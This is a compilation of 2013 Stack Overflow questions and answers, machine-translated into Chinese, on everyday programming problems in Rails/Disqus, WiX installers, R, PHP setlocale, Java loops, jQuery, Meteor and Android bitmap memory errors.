> 标签：ruby-on-rails, ruby, disqus

我刚刚注册了一个 disqus 帐户以在我的网站上进行设置。

我将我的网站 URL 注册为[http://www.mydomain.com](http://www.mydomain.com)

我正在实施评论系统的地方在

```
'/article/:post_id' 
```

例子：`http://mydomain.com/article/261`

在每个不同的文章 ID 页面中，我希望显示 disqus 评论系统。我目前可以发表评论，但是当我回到页面时它们没有显示。它们被保存为我在我的 disqus 管理面板中看到的整个网站的一部分，但它们没有显示在那个特定的文章页面上。我在哪里设置 URL 以使其正常工作？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-19T18:17:43.657

我通过使用解决了它`disqus_identifier`

# service - 通过系统服务卸载msi包失败：由于客户端源不同步，源无效（产品代码相同）

> ID：16110854
> 
> 赞同：1
> 
> 时间：2013-04-19T18:03:00.163
> 
> 标签：service, installation, wix

我使用 WiX 3.7 编写安装程序，我将安装 ac# 系统服务将尝试重新安装软件，使用 msiexec -x {product_code} -quiet。我的操作系统是Win8 我首先通过UI安装软件，过了一会儿服务会新建一个进程并开始调用msiexec，但是失败了。你能帮我解决这个问题吗？我已经挣扎了很久！非常感谢！

我的日志如下：

```
MSI (s) (7C:80) [00:22:01:708]: Warning: The package code in the cached package 'C:\windows\Installer\134f7d5.msi' does not match the registered package code.  Cached       
MSI (s) (7C:80) [00:22:01:724]: SOURCEMGMT: Source is invalid due to client source out of sync (product code is the same). 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-19T18:07:35.233

服务是什么帐户，因此新进程在什么帐户下运行？默认帐户（例如 LocalSystem）可能无权访问 msi 信息。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-19T18:43:44.043

该消息意味着安装了相同的包`ProductCode`（通过`Product/@Id`属性设置）但不是同一个包。如果您安装一个包，重新构建它（因此新包获得一个新的“包代码”）然后尝试使用重新构建的包卸载，通常会发生这种情况。如果在卸载期间某些原因导致源解析，并且 Windows 安装程序在它期望旧包的位置找到新重建的包，也会发生这种情况。

要摆脱困境，请尝试使用较新的软件包重新缓存/重新安装，然后卸载：

```
msiexec /fv path\to\your.msi /l*v install.txt /qb
msiexec /x path\to\your.msi /l*v uninstall.txt /qb 
```

之后，再次测试您的方案，而无需在更新之间更改 MSI。您将慢慢能够追踪到您的系统中导致 Windows 安装程序感到困惑和不满意的变化。

祝你好运！

# javascript - Android：拦截带有参数的 Javascript 代码以调用 java 方法

> ID：16110856
> 
> 赞同：1
> 
> 时间：2013-04-19T18:03:03.230
> 
> 标签：javascript, android, html

我不知道如何从片段内的 webview 获取所有 javascript 方法及其参数并为每个方法调用特定的 java 方法；

在我的片段中，我有一个这样的 html 代码：

```
String str="<div class=\"comment-page\" onclick=\"addComment(16802)\" style=\"margin-bottom:30px;background:none no-repeat right center #F4ECE1; padding-top:5px;padding-bottom:5px;border-top:3px solid #401B01; padding-left:5px; font-size:16px;\">add comment <img src=\"add.png\"/></div>
content.loadDataWithBaseURL("http://www.mysite.com/",str, "text/html", "UTF-8", null); 
```

当我单击“添加评论”时，我想显示新活动或新片段，其中包含带有输入字段的 web 视图和“发送”按钮，该按钮也具有 javascript 方法。

# r - 重命名数据框中的几列：为什么使用 %in% 运算符的 ifelse 不保留顺序？

> ID：16110859
> 
> 赞同：4
> 
> 时间：2013-04-19T18:03:11.160
> 
> 标签：r

这是参考[这个问题](https://stackoverflow.com/a/10669726/419842)。

我想重命名大型数据框中的列子集。我希望以下代码将列、、 `X4`和`X5`分别重命名为、、、`X6`和：`X7``gradek``grade1``grade2``grade3`

```
set.seed(1)
in.df <- data.frame( matrix( rnorm(60), ncol=10) )
names(in.df) <- ifelse( names(in.df) %in% c('X4', 'X5', 'X6', 'X7'),
                         paste('grade', c('k',1:3), sep=''),
                         names(in.df) ) 
```

然而，

```
> names(in.df)
 [1] "X1"     "X2"     "X3"     "grade3" "gradek" "grade1" "grade2" "X8"    
 [9] "X9"     "X10" 
```

虽然

```
> paste('grade', c('k',1:3), sep='')
[1] "gradek" "grade1" "grade2" "grade3" 
```

表明订单没有被保留。[这个线程](https://stackoverflow.com/questions/10586652/r-preserve-order-when-using-matching-operators-in)，建议使用`match`而不是`%in%`会工作，但在这种情况下它不会。（也许在其他版本的 R 中也是如此。在我安装的版本（2.15.3）中，帮助页面上的`match`建议`%in%`是通过这样定义的，`match`因此切换它没有帮助。）

任何帮助，将不胜感激！

**接受的答案** [这个答案](https://stackoverflow.com/a/16111202/419842)解决了我的重命名问题。 [这个答案](https://stackoverflow.com/a/16111322/419842)解释了奇怪的行为是由于回收。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-19T18:24:18.460

`%in%`应该工作，但也许`match`更好。

考虑以下。“A”和“B”代表您的`names(in.df)`. 我们希望使用 的结果*以该顺序替换“matchme”中*`paste('grade', c('k',1:3), sep='')`的值。

比较不同的输出：

```
A <- B <- c("X1", "X2", "X3", "X4", "X5", "X6", "X7", "X8", "X9", "X10")
matchme <- c('X4', 'X7', 'X6', 'X5')
A[A %in% matchme] <- paste('grade', c('k',1:3), sep='')
A
#  [1] "X1"     "X2"     "X3"     "gradek" "grade1" "grade2" "grade3" "X8"    
#  [9] "X9"     "X10"  
B[match(matchme, B)] <- paste('grade', c('k',1:3), sep='')
B
#  [1] "X1"     "X2"     "X3"     "gradek" "grade3" "grade2" "grade1" "X8"    
#  [9] "X9"     "X10" 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-19T18:32:17.920

[Ananda 的回答](https://stackoverflow.com/a/16111202/892313)给出了如何做你想做的事的好方法。相反，我将回答这个问题，即为什么你得到了你所做的结果而不是你预期的结果。

名称看起来乱序的原因与`ifelse`工作原理和参数回收有关。让我们看一下 的三个参数`ifelse`：

```
> list(names(in.df) %in% c('X4', 'X5', 'X6', 'X7'),
+      paste('grade', c('k',1:3), sep=''),
+      names(in.df))
[[1]]
 [1] FALSE FALSE FALSE  TRUE  TRUE  TRUE  TRUE FALSE FALSE FALSE

[[2]]
[1] "gradek" "grade1" "grade2" "grade3"

[[3]]
 [1] "X1"  "X2"  "X3"  "X4"  "X5"  "X6"  "X7"  "X8"  "X9"  "X10" 
```

`ifelse`根据第一个参数是 TRUE 还是 FALSE 来决定选择哪个对应元素。但是第二个参数没有第一个长，所以它被回收为正确的长度。将它们放入 data.frame 以便并排查看它们更容易，并手动扩展第二组名称，给出：

```
> data.frame(test = names(in.df) %in% c('X4', 'X5', 'X6', 'X7'),
+            `TRUE` = rep(paste('grade', c('k',1:3), sep=''),length=10),
+            `FALSE` = names(in.df))
    test  TRUE. FALSE.
1  FALSE gradek     X1
2  FALSE grade1     X2
3  FALSE grade2     X3
4   TRUE grade3     X4
5   TRUE gradek     X5
6   TRUE grade1     X6
7   TRUE grade2     X7
8  FALSE grade3     X8
9  FALSE gradek     X9
10 FALSE grade1    X10 
```

因此使用了新名称的第 4、5、6 和 7 个元素，由于参数循环，它们对应于第 4、1、2 和 3 个。

# asp.net - 如何开始使用 RavenDB.AspNetHost 包？

> ID：16110865
> 
> 赞同：0
> 
> 时间：2013-04-19T18:03:41.663
> 
> 标签：asp.net, ravendb, ravendb-studio

如何使用和配置来自 NuGet 的 RavenDB.AspNetHost 包？

我将它添加到一个空的 ASP.NET 4.5 WebApplication 项目中，这个包正在向`<add name="RavenDB" connectionString="Url=http://localhost:8080" />`我的 webconfig 添加一个连接字符串。

但是当启动项目（使用 VS2012 + IIS Express 运行）时，它没有在端口 8080 上侦听。来自同一个 ASP.NET 应用程序的 DocumentSession 也无法连接到服务器。

如何进入工作室？

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-21T09:25:48.240

使用 AspNetHost 时，您将 RavenDB 托管在 ASP.NET / IIS 中，您可以通过项目为您提供的 url 访问它。

# php - 为什么我会收到此 PHP 警告：“setlocale(): Specified locale name is too long”？

> ID：16110866
> 
> 赞同：2
> 
> 时间：2013-04-19T18:03:42.817
> 
> 标签：php, centos

当我运行这个脚本时：

```
<?php
$old_locale = setlocale(LC_ALL, '0');
setlocale(LC_ALL, $old_locale); 
```

我得到：

```
PHP Warning:  setlocale(): Specified locale name is too long in /tmp/loc.php on line 3
PHP Stack trace:
PHP   1\. {main}() /tmp/loc.php:0
PHP   2\. setlocale() /tmp/loc.php:3 
```

如果我也 print `$old_locale`，它看起来像：

```
LC_CTYPE=en_US.UTF-8;LC_NUMERIC=C;LC_TIME=en_US.UTF-8;LC_COLLATE=en_US.UTF-8;LC_MONETARY=en_US.UTF-8;LC_MESSAGES=en_US.UTF-8;LC_PAPER=en_US.UTF-8;LC_NAME=en_US.UTF-8;LC_ADDRESS=en_US.UTF-8;LC_TELEPHONE=en_US.UTF-8;LC_MEASUREMENT=en_US.UTF-8;LC_IDENTIFICATION=en_US.UTF-8 
```

我想最基本的“为什么”是我试图传递一个确实太长的语言环境字符串。在`ext/standard/string.c`我看到：

```
if (Z_STRLEN_PP(plocale) >= 255) {
    php_error_docref(NULL TSRMLS_CC, E_WARNING, "Specified locale name is too long");
    break;
} 
```

PHP版本：

```
PHP 5.4.13 (cli) (built: Mar 15 2013 11:27:51) 
Copyright (c) 1997-2013 The PHP Group
Zend Engine v2.4.0, Copyright (c) 1998-2013 Zend Technologies
    with Xdebug v2.2.2, Copyright (c) 2002-2013, by Derick Rethans 
```

操作系统：最新的 CentOS 版本 6.4 (Final)

`locale`从命令行运行的输出：

```
LANG=en_US.UTF-8
LC_CTYPE="en_US.UTF-8"
LC_NUMERIC="en_US.UTF-8"
LC_TIME="en_US.UTF-8"
LC_COLLATE="en_US.UTF-8"
LC_MONETARY="en_US.UTF-8"
LC_MESSAGES="en_US.UTF-8"
LC_PAPER="en_US.UTF-8"
LC_NAME="en_US.UTF-8"
LC_ADDRESS="en_US.UTF-8"
LC_TELEPHONE="en_US.UTF-8"
LC_MEASUREMENT="en_US.UTF-8"
LC_IDENTIFICATION="en_US.UTF-8"
LC_ALL= 
```

[我在使用Goodby, CSV](https://github.com/goodby/csv/blob/master/src/Goodby/CSV/Import/Standard/Lexer.php#L60)时遇到了这个 PHP 警告。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-19T18:10:43.077

set local 的第二个参数是一个字符串或一个数组，我认为你必须分开你的 $old_locale 才能工作：

```
<?php
$old_locale = setlocale(LC_ALL, '0');
$bits = explode(';',$old_locale);
$loc = array();
foreach($bits as $bit) {
   $value = explode("=",$bit);
   $loc[] = $value[1];
}
setlocale(LC_ALL, $loc) ; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-19T18:12:04.087

```
$old_locale = explode(";", $old_locale);
$old_locale = $old_locale[0];//returns LC_CTYPE=en_US.UTF-8
$old_locale = explode("=", $old_locale);
$old_locale = $old_locale[1];//returns en_US.UTF-8
setlocale(LC_ALL, $old_locale); 
```

# xml - 在 XSL 中转义“@”/“at”符号

> ID：16110874
> 
> 赞同：-1
> 
> 时间：2013-04-19T18:04:29.820
> 
> 标签：xml, escaping

我正在开发一个将电子邮件地址作为参数的 XSLT。当**xsltproc**到达转换中实际使用传入值的点时，它会失败，因为电子邮件地址包含“@”符号：

```
<xsl:template match="revision/author/email"> 
    <xsl:element name="email">
        <xsl:value-of select="$email" />
    </xsl:element>
</xsl:template> 
```

返回的输出是：

```
XPath error : Invalid expression
curses@example.com 
```

如何修改 XSL 以便正确转义“@”符号。请注意，我可以访问将提供输入参数的进程，并且*如果*我知道用什么转义它，也可以在那时转义它。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-20T15:36:05.230

经过进一步调查，问题是我使用**--param参数向****xsltproc**提供了参数。**改用 --stringparam**可以解决此问题。

# jquery - 如何使 div 元素既可滚动又可拖动以用于内部内容？

> ID：16110875
> 
> 赞同：0
> 
> 时间：2013-04-19T18:04:32.487
> 
> 标签：jquery, css, draggable, scrollable

我遇到了一个问题，我在网页上布置了一个游戏板。如果这个游戏板是 20x20 的方格并且它的容器只能容纳 10x10，我需要里面的游戏板是可拖动的。用户不应将其拖出容器的边界（因为 0,0 瓷砖不应通过容器的左上角，而 19,19 瓷砖不应高于或左侧 o容器的右下角）。

jQuery UI 有一个允许我拖动它的可拖动元素，但我似乎可以做出的唯一约束纯粹与容器本身有关。我通过设置边界（使用 [x1, y1, x2, y2] 格式而不是容器）解决了这个问题，并且工作了一段时间——除了拖动速度很慢并且不适用于可滚动的解决方案。

我的可滚动字段问题（没有拖动）将滚动条放在内容中，看起来很乱。

是否有一个很好的可拖动解决方案，可以惯性滚动到元素？滚动是唯一的方法吗？我真的仅限于在一个或另一个之间切换吗？

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-19T18:07:27.247

尝试过使用 css 元素 "scroll: auto" 吗？

# java - 你可以从数组的 for 循环中添加值吗？

> ID：16110877
> 
> 赞同：-1
> 
> 时间：2013-04-19T18:04:35.067
> 
> 标签：java, arrays

我有一个循环遍历整数数组的 for 循环。我试图得到数组中所有元素的总和。我可以循环执行此操作吗？

下面的代码：

```
 int numOfValues;

    //prompt user for number of values
    System.out.print("How many values? ");
    numOfValues = input.nextInt();

    int[] values = new int[numOfValues];        

    for(int i=1; i<numOfValues;i++)
    {

        System.out.print("Value " + i + " :");
        values[i] = input.nextInt(); 
        int sum += 0 + values[i];
        System.out.print(sum);
    } 
```

这行 int`sum += 0 + values[i];`

是我试图让所有数组元素值总计的地方，但我认为它是错误的。它只是打印出实际数字而不是总和。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-19T18:05:41.677

`int sum`在 for 循环之外声明

IE

```
 int sum =0;  
for(int i=0; i<numOfValues;i++)
    {

        System.out.print("Value " + i + " :");
        values[i] = input.nextInt(); 
         sum += values[i];
        System.out.print(sum);
    } 
```

**编辑：**正如所`@Orin`指出的

还

以零索引开始 for 循环

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-19T18:06:57.397

在循环外声明 int sum

```
 int sum =0;  
for(int i=0; i<numOfValues;i++)
    {

        System.out.print("Value " + i + " :");
        values[i] = input.nextInt(); 
         sum += values[i];
        System.out.print(sum);
    } 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-04-19T18:07:45.043

1.  java中数组元素从0开始。所以你`for`也应该从 0 开始。
2.  在循环之前声明 sum
3.  在循环之前将总和初始化为 0
4.  循环后打印总和。

改变程序

```
int numOfValues;

//prompt user for number of values
System.out.print("How many values? ");
numOfValues = input.nextInt();

int[] values = new int[numOfValues];        

int sum = 0;
for(int i=0; i<numOfValues;i++)
{

    System.out.print("Value " + i + " :");
    values[i] = input.nextInt(); 
    sum += values[i];
}

System.out.print(sum); 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2013-04-19T18:07:57.813

**怎么修：**

将`sum`变量放在循环之外

```
int sum = 0
for(int i = 1; i < numOfValues; i++)
{

        System.out.print("Value " + i + " :");
        values[i] = input.nextInt(); 
        sum += values[i];
        System.out.print(sum);
} 
```

**原因：**

sum 的值不会被存储，因为您每次循环迭代时都定义了变量。您只需要定义一次并不断为`sum`'s 的值添​​加值。

**而且：**

既然你说：

> 我正在尝试获取数组中所有元素的总和

要遍历数组中的所有元素，您需要从起始索引开始迭代。数组的起始索引`0` **不是** `1`。所以，你需要改变这个：

```
for(int i = 1; i < numOfValues; i++) 
```

至

```
for(int i = 0; i < numOfValues; i++) 
```

**此外，供您参考**：

`sum += values[i];`相当于`sum = sum + values[i];`

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2013-04-19T18:08:53.363

您的变量 sum 始终为数组的每个循环初始化：

尝试这个：

```
int sum =0;  
for(int i=1; i<numOfValues;i++)
{

    System.out.print("Value " + i + " :");
    values[i] = input.nextInt(); 
     sum += values[i];
    System.out.print(sum);
} 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2013-04-19T19:02:46.300

先声明

```
sum = 0; 
```

并在循环内使用

```
sum += values[i]; 
```

还要记住，数组从零开始。祝你好运。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2013-04-19T18:07:28.623

```
int sum = 0;
for(int i=0; i<numOfValues;i++)
{
    System.out.print("Value " + i + " :");
    values[i] = input.nextInt(); 
    sum += values[i];
 }
 System.out.print(sum); 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2013-04-19T18:11:24.290

你能试试这个方法吗

```
 System.out.print("How many values? ");
   numOfValues = input.nextInt();
   int[] values = new int[numOfValues];        
   int sum = 0;
   for(int i=0; i<numOfValues;i++)
   {
       System.out.print("Value " + i + " :");
       values[i] = input.nextInt(); 
       sum += values[i];
   }
   System.out.print(sum); 
```

# asp.net - Try and Catch 在 SQL 打开命令上不起作用

> ID：16110878
> 
> 赞同：0
> 
> 时间：2013-04-19T18:04:40.877
> 
> 标签：asp.net, sql, try-catch

我想通过使用 SQL 数据库连接检查身份验证来启动我的页面。这是我的代码，我不知道为什么它不起作用：

```
public partial class SiteMaster : System.Web.UI.MasterPage
{
  protected void Page_Load(object sender, EventArgs e)
  {
    // Try to open database.
    try
    {
        SqlConnection con = new SqlConnection();
        con.ConnectionString = WebConfigurationManager.ConnectionStrings["blahblah"].ConnectionString;
        con.Open();
        con.Close();
        //successful login, do nothing.
    }
    catch (Exception err) //if error Opening, catch the error, and display
    {
        SiteMasterMsg.Text = "Could not login in using ___.";
        SiteMasterMsg.Text += err.Message;
    } 
```

问题是页面刚刚死掉，并给了我默认的 IIS 错误页面，显示数据库连接登录失败。我希望它会“尝试”连接，然后在登录尝试失败时，捕获错误，并显示错误的页面。我的 Default.aspx 页面上有这个：

```
<asp:Label id="SiteMasterMsg" runat="server" /> 
```

我不知道出了什么问题。我错过了什么，还是有更好的方法来做到这一点？

提前致谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-22T20:02:00.203

我意识到问题是因为这段代码在我的 Site.Master.cs 页面上，所以页面永远不会真正完全开发，它会在某种程度的错误处停止，这就是我所看到的。解决方案是制作一个专用的 Login.aspx 页面，而不是将此代码放在 Site.Master.cs 页面中。

# jquery - Jquery，如何获取 prev() 输入框值？

> ID：16110882
> 
> 赞同：-3
> 
> 时间：2013-04-19T18:04:50.420
> 
> 标签：jquery

```
<tr>
    <td>Arizona</td>
    <td>AZ</td>
    <td>
        <input id="item_Rate" name="item.Rate" size="5" type="text" value="1.00" />
    </td>
    <td>
        <a href="javascript:UpdateTaxRate(this, 4)">Update</a>
    </td>
</tr><tr>
    <td>Arkansas</td>
    <td>AR</td>
    <td>
        <input id="item_Rate" name="item.Rate" size="5" type="text" value="2.00" />
    </td>
    <td>
        <a href="javascript:UpdateTaxRate(this, 5)">Update</a>
    </td>
</tr><tr>
    <td>California</td>
    <td>CA</td>
    <td>
        <input id="item_Rate" name="item.Rate" size="5" type="text" value="3.00" />
    </td>
    <td>
        <a href="javascript:UpdateTaxRate(this, 6)">Update</a>
    </td>
</tr> 
```

我喜欢上表，我想在点击更新时获取之前的 DOM 输入框值。

我怎么能得到那个？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-19T18:07:39.160

可能是这样的：

```
$(this).closest('tr').find('input[type="text"]').val(); 
```

`$(this)`单击的锚点在哪里，然后获取最近的父项，`<tr>`然后`.find()`获取输入并获取它的值。

# meteor - 我最早可以得到一个 Meteor.user()

> ID：16110884
> 
> 赞同：0
> 
> 时间：2013-04-19T18:04:58.667
> 
> 标签：meteor

我想将我的用户状态更新为在线，这意味着运行此代码（咖啡脚本......）

```
Meteor.users.update _id: Meteor.user()._id, $set: 'profile.idle': true, 'profile.online': true if Meteor.user()? 
```

我不知道把它放在哪里，（可以把它放在客户端吗？）即使用户之前已经登录，这段代码在登录用户的情况下肯定会在哪里运行？

从小谷歌搜索我发现流星开始事件不是地方，是什么地方？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-19T18:26:53.297

Deps.autorun 块中的客户端会这样做

在 js 中会是这样的

```
Deps.autorun(function(){
   if(Meteor.user()){
       Meteor.users.update(Meteor.userId(),{$set:{<your fields here>}});
   }
}); 
```

--

如果您试图检测用户在线并且可以使用陨石，您可能需要查看[https://atmosphere.meteor.com/package/profile-online](https://atmosphere.meteor.com/package/profile-online)

您也可以自己滚动，通过设置`Meteor.setInterval`每 10 秒左右调用一次来`lastSeen`为用户更新时间，然后检测用户是否在线`lastSeen > timeNow - userTimeout[60 seconds?]`

# android - 在自定义列表视图中添加图像时 Android 应用程序崩溃

> ID：16110888
> 
> 赞同：-1
> 
> 时间：2013-04-19T18:05:14.430
> 
> 标签：android, android-listview, camera, out-of-memory

我正在制作**自定义列表视图**，其中我必须添加用户从 sd 卡或相机拍摄的图像。为此，我拍摄一个图像视图和两个按钮。一个按钮从**相机**拍摄照片，另一个按钮从**sd 卡**拍摄，然后他们添加图像视图中的图片..现在当我在自定义列表视图中传递该图像 uri 时，第一次添加图像，但第二次应用程序崩溃....如果有人知道答案，请发布它。提前致谢！！

这是代码。这是用于按钮单击..

```
camera.setOnClickListener(new View.OnClickListener() {

            @Override
            public void onClick(View v) {

                Intent intent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
                intent.putExtra(MediaStore.EXTRA_OUTPUT, Uri.fromFile(new File(
                        Environment.getExternalStorageDirectory(), "temp.jpg")));
                startActivityForResult(intent, 2);

            }
        });

        sdcard.setOnClickListener(new Button.OnClickListener() {

            @Override
            public void onClick(View v) {

                Intent i = new Intent(
                        Intent.ACTION_PICK,
                        android.provider.MediaStore.Images.Media.INTERNAL_CONTENT_URI);

                startActivityForResult(i, 0);

            }
        });

        adapter = new SimpleAdapter(
                this,
                list12,
                R.layout.list_row_1,
                new String[] { "name", "address", "location", "image" },
                new int[] { R.id.name, R.id.address, R.id.location, R.id.image });

        setListAdapter(adapter); 
```

在这之后..

```
@Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {

        super.onActivityResult(requestCode, resultCode, data);

        if (requestCode == 2) {
            File picture = new File(Environment.getExternalStorageDirectory()
                    + "/temp.jpg");

            imgUri = Uri.fromFile(picture);
            targetImage.setImageURI(imgUri);
            location1 = "Camera";
        }

        else {
            if (resultCode == RESULT_OK) {
                targetUri = data.getData();
                textTargetUri.setText(targetUri.toString());
                try {
                    bitmap = BitmapFactory.decodeStream(getContentResolver()
                            .openInputStream(targetUri));

                    //decodeBitmap(bitmap, 4, 4);

                    targetImage.setImageBitmap(bitmap);
                    location1 = "Sd card";

                } catch (FileNotFoundException e) {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                }
            }

        } 
```

然后我在列表视图中添加图像

```
private void populateList() {

    HashMap<String, Object> temp11 = new HashMap<String, Object>();
    name1 = textname.getText().toString();
    address1 = textaddress.getText().toString();

    if (name1.equals("") || address1.equals("")) {
        String str = "Don't Leave field blank !";
        Toast toast = Toast.makeText(LastPage.this,

        str, Toast.LENGTH_SHORT);
        toast.setGravity(Gravity.CENTER, 0, 0);
        toast.show();
    }

    else if (location1 == "Sd card") {

        textname.setText("");
        textaddress.setText("");
        temp11.put("name", name1);
        temp11.put("address", address1);

        temp11.put("location", location1);

        temp11.put("image", targetUri);
        targetImage.setImageBitmap(null);
        list12.add(0, temp11);
        adapter.notifyDataSetChanged();
    } else if (location1 == "Camera") {

        textname.setText("");
        textaddress.setText("");
        temp11.put("name", name1);
        temp11.put("address", address1);
        temp11.put("location", location1);

        temp11.put("image", imgUri);
        targetImage.setImageBitmap(null);
        list12.add(0, temp11);
        adapter.notifyDataSetChanged();
    } 
```

日志猫

```
04-20 00:03:49.599: E/AndroidRuntime(4129): FATAL EXCEPTION: main
04-20 00:03:49.599: E/AndroidRuntime(4129): java.lang.OutOfMemoryError: bitmap size exceeds VM budget
04-20 00:03:49.599: E/AndroidRuntime(4129):     at android.graphics.BitmapFactory.nativeDecodeStream(Native Method)
04-20 00:03:49.599: E/AndroidRuntime(4129):     at android.graphics.BitmapFactory.decodeStream(BitmapFactory.java:573)
04-20 00:03:49.599: E/AndroidRuntime(4129):     at android.graphics.BitmapFactory.decodeResourceStream(BitmapFactory.java:439)
04-20 00:03:49.599: E/AndroidRuntime(4129):     at android.graphics.drawable.Drawable.createFromResourceStream(Drawable.java:697)
04-20 00:03:49.599: E/AndroidRuntime(4129):     at android.graphics.drawable.Drawable.createFromStream(Drawable.java:657)
04-20 00:03:49.599: E/AndroidRuntime(4129):     at android.widget.ImageView.resolveUri(ImageView.java:521)
04-20 00:03:49.599: E/AndroidRuntime(4129):     at android.widget.ImageView.setImageURI(ImageView.java:305)
04-20 00:03:49.599: E/AndroidRuntime(4129):     at android.widget.SimpleAdapter.setViewImage(SimpleAdapter.java:264)
04-20 00:03:49.599: E/AndroidRuntime(4129):     at android.widget.SimpleAdapter.bindView(SimpleAdapter.java:192)
04-20 00:03:49.599: E/AndroidRuntime(4129):     at android.widget.SimpleAdapter.createViewFromResource(SimpleAdapter.java:126)
04-20 00:03:49.599: E/AndroidRuntime(4129):     at android.widget.SimpleAdapter.getView(SimpleAdapter.java:114)
04-20 00:03:49.599: E/AndroidRuntime(4129):     at android.widget.AbsListView.obtainView(AbsListView.java:1610)
04-20 00:03:49.599: E/AndroidRuntime(4129):     at android.widget.ListView.measureHeightOfChildren(ListView.java:1264)
04-20 00:03:49.599: E/AndroidRuntime(4129):     at android.widget.ListView.onMeasure(ListView.java:1175)
04-20 00:03:49.599: E/AndroidRuntime(4129):     at android.view.View.measure(View.java:8313)
04-20 00:03:49.599: E/AndroidRuntime(4129):     at android.widget.RelativeLayout.measureChild(RelativeLayout.java:566)
04-20 00:03:49.599: E/AndroidRuntime(4129):     at android.widget.RelativeLayout.onMeasure(RelativeLayout.java:381)
04-20 00:03:49.599: E/AndroidRuntime(4129):     at android.view.View.measure(View.java:8313)
04-20 00:03:49.599: E/AndroidRuntime(4129):     at android.view.ViewGroup.measureChildWithMargins(ViewGroup.java:3138)
04-20 00:03:49.599: E/AndroidRuntime(4129):     at android.widget.FrameLayout.onMeasure(FrameLayout.java:250)
04-20 00:03:49.599: E/AndroidRuntime(4129):     at android.view.View.measure(View.java:8313)
04-20 00:03:49.599: E/AndroidRuntime(4129):     at android.view.ViewGroup.measureChildWithMargins(ViewGroup.java:3138)
04-20 00:03:49.599: E/AndroidRuntime(4129):     at android.widget.FrameLayout.onMeasure(FrameLayout.java:250)
04-20 00:03:49.599: E/AndroidRuntime(4129):     at android.view.View.measure(View.java:8313)
04-20 00:03:49.599: E/AndroidRuntime(4129):     at android.view.ViewRoot.performTraversals(ViewRoot.java:845)
04-20 00:03:49.599: E/AndroidRuntime(4129):     at android.view.ViewRoot.handleMessage(ViewRoot.java:1866)
04-20 00:03:49.599: E/AndroidRuntime(4129):     at android.os.Handler.dispatchMessage(Handler.java:99)
04-20 00:03:49.599: E/AndroidRuntime(4129):     at android.os.Looper.loop(Looper.java:130)
04-20 00:03:49.599: E/AndroidRuntime(4129):     at android.app.ActivityThread.main(ActivityThread.java:3687)
04-20 00:03:49.599: E/AndroidRuntime(4129):     at java.lang.reflect.Method.invokeNative(Native Method)
04-20 00:03:49.599: E/AndroidRuntime(4129):     at java.lang.reflect.Method.invoke(Method.java:507)
04-20 00:03:49.599: E/AndroidRuntime(4129):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:867)
04-20 00:03:49.599: E/AndroidRuntime(4129):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:625)
04-20 00:03:49.599: E/AndroidRuntime(4129):     at dalvik.system.NativeStart.main(Native Method)
04-20 00:03:58.999: W/dalvikvm(4206): VFY: unable to resolve virtual method 2385: Lcom/korovyansk/android/sample/slideout/SampleActivity;.getActionBar ()Landroid/app/ActionBar; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-19T18:47:22.697

你读过[这个文档](http://developer.android.com/training/displaying-bitmaps/index.html)吗？

特别是您需要检查如何[管理内存](http://developer.android.com/training/displaying-bitmaps/manage-memory.html)。例如，在加载位图之前，您应该尝试验证需要使用哪些选项来缩小其大小。

[这个答案](https://stackoverflow.com/questions/3331527/android-resize-a-large-bitmap-file-to-scaled-output-file/8497703#8497703)可能会帮助您在尝试加载图像之前重新缩放图像所需的代码。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-19T18:44:10.957

来自相机的大图像？尝试减小该图像的大小（降低相机设置中的分辨率）。

看起来您超出了应用程序可用的内存：

从您发布的日志中：

```
java.lang.OutOfMemoryError: bitmap size exceeds VM budget 
```

但除此之外，您可能正在泄漏一些内存。您应该丢弃（回收）那些位图等。

@DigCamara 在他/她的回答中发布了一些出色的链接！真的，必须阅读您的情况。

# ios - UITableView 长按菜单 - 它来自哪里？

> ID：16110892
> 
> 赞同：0
> 
> 时间：2013-04-19T18:05:21.713
> 
> 标签：ios, uitableview

当我长按 UITableView 中的一行时（在 iPad 上显示为弹出框，FWIW），我看到“复制”菜单项出现。我没有任何 UIGestureRecognizer 附加到表格或单元格。该单元格有一个 UILabel 和一个 UIImageView。

关于这个菜单项来自哪里的任何猜测？这是所有 UILabelViews 上的某种默认设置，如果是这样，我该如何禁用它？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-12T08:21:56.157

在函数中 - (BOOL) canPerformAction:(SEL)action withSender:(id)sender

做

```
if ( action == @selector( copy: ) )
    {
        // turn off copy: if you like:
        return NO;
    } 
```

它将解决您的问题。

# jquery - jQuery Datatables：如何提取行标题标题？

> ID：16110893
> 
> 赞同：0
> 
> 时间：2013-04-19T18:05:22.173
> 
> 标签：jquery, datatables

编辑：这只发生在我使用 sScrollX 时。-- [http://jsfiddle.net/4n3Hp/](http://jsfiddle.net/4n3Hp/) -- 不幸的是，这个特殊用例需要它。

